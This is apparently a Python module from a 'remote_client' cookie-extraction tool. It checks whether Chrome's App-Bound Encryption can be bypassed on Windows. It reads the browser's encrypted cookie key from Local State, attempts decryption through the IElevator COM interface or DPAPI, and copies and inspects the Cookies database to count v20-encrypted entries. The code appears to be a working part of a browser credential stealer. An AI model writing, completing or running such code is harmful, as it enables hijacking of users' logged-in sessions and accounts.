"""ABE diagnostics for client_config."""
from __future__ import annotations

import base64
import json
import shutil
import sqlite3
import tempfile
from pathlib import Path
from typing import Any

from remote_client.cookie_extractor import ABE_AVAILABLE
from remote_client.cookie_extractor.browsers import BROWSER_CONFIG, resolve_path


def _load_chrome_local_state() -> Path | None:
    config = BROWSER_CONFIG.get("chrome") or {}
    raw_path = config.get("local_state")
    if not raw_path:
        return None
    return resolve_path(raw_path)


def _read_encrypted_key(local_state_path: Path) -> tuple[bytes | None, str | None]:
    try:
        raw = local_state_path.read_text(encoding="utf-8")
        data = json.loads(raw)
    except Exception:
        return None, None
    encrypted_key_b64 = None
    if isinstance(data, dict):
        encrypted_key_b64 = (
            data.get("os_crypt", {}).get("encrypted_key")
            if isinstance(data.get("os_crypt"), dict)
            else None
        )
    if not isinstance(encrypted_key_b64, str):
        return None, _read_chrome_version(data)
    try:
        encrypted_key = base64.b64decode(encrypted_key_b64)
    except Exception:
        encrypted_key = None
    return encrypted_key, _read_chrome_version(data)


def _read_chrome_version(payload: dict | None) -> str | None:
    if not isinstance(payload, dict):
        return None
    browser = payload.get("browser") if isinstance(payload.get("browser"), dict) else {}
    version = browser.get("last_version") if isinstance(browser, dict) else None
    if isinstance(version, str) and version.strip():
        return version.strip()
    return None


def _copy_db(db_path: Path) -> Path | None:
    try:
        handle = tempfile.NamedTemporaryFile(prefix="rc_abe_", suffix=db_path.suffix, delete=False)
        temp_path = Path(handle.name)
        handle.close()
        shutil.copyfile(db_path, temp_path)
        return temp_path
    except Exception:
        return None


def _count_v20_cookies() -> tuple[int, int] | None:
    config = BROWSER_CONFIG.get("chrome") or {}
    cookie_paths = config.get("cookie_paths") or []
    for path in cookie_paths:
        resolved = resolve_path(path)
        if not resolved or not resolved.exists():
            continue
        temp_db = _copy_db(resolved)
        if not temp_db:
            continue
        conn = None
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT encrypted_value FROM cookies")
            total = 0
            v20 = 0
            for (encrypted_value,) in cursor:
                total += 1
                if encrypted_value and bytes(encrypted_value).startswith(b"v20"):
                    v20 += 1
            conn.close()
            return v20, total
        except Exception:
            try:
                if conn is not None:
                    conn.close()
            except Exception:
                pass
        finally:
            try:
                temp_db.unlink(missing_ok=True)
            except Exception:
                pass
    return None


def collect_abe_status() -> dict[str, Any]:
    result: dict[str, Any] = {
        "status": "unknown",
        "detected": False,
        "available": False,
        "method": None,
        "recommendation": "",
        "chrome_version": None,
        "local_state_found": False,
        "cookies_v20": None,
        "cookies_total": None,
    }
    if not ABE_AVAILABLE:
        result["status"] = "blocked"
        return result
    try:
        from remote_client.cookie_extractor.app_bound_encryption import (
            check_abe_support,
            decrypt_abe_key_with_dpapi,
            is_abe_encrypted_key,
            _try_ielevator_com_decrypt,
        )
    except Exception:
        result["status"] = "blocked"
        return result

    support = check_abe_support()
    result.update({k: support.get(k) for k in support.keys()})

    local_state_path = _load_chrome_local_state()
    if local_state_path and local_state_path.exists():
        result["local_state_found"] = True
        encrypted_key, chrome_version = _read_encrypted_key(local_state_path)
        if chrome_version:
            result["chrome_version"] = chrome_version
        if encrypted_key:
            detected = is_abe_encrypted_key(encrypted_key)
            result["detected"] = detected
            if detected:
                method = None
                decrypted = None
                if support.get("ielevator_available"):
                    try:
                        decrypted = _try_ielevator_com_decrypt(encrypted_key)
                        if decrypted:
                            method = "IElevator"
                    except Exception:
                        decrypted = None
                if not decrypted and support.get("dpapi_available"):
                    try:
                        decrypted = decrypt_abe_key_with_dpapi(encrypted_key)
                        if decrypted:
                            method = "DPAPI"
                    except Exception:
                        decrypted = None
                if decrypted:
                    result["available"] = True
                    result["method"] = method

    windows_ok = bool(support.get("windows"))
    chrome_installed = bool(support.get("chrome_installed"))
    if not windows_ok or not chrome_installed:
        result["status"] = "blocked"
    elif not result["detected"]:
        result["status"] = "available"
    elif result["available"]:
        result["status"] = "available"
    elif support.get("ielevator_available") or support.get("dpapi_available"):
        result["status"] = "detected"
    else:
        result["status"] = "blocked"

    if result.get("detected") and not result.get("available"):
        if not support.get("ielevator_available"):
            result["recommendation"] = "Install comtypes: pip install comtypes"
    counts = _count_v20_cookies()
    if counts:
        v20, total = counts
        result["cookies_v20"] = v20
        result["cookies_total"] = total
    return result
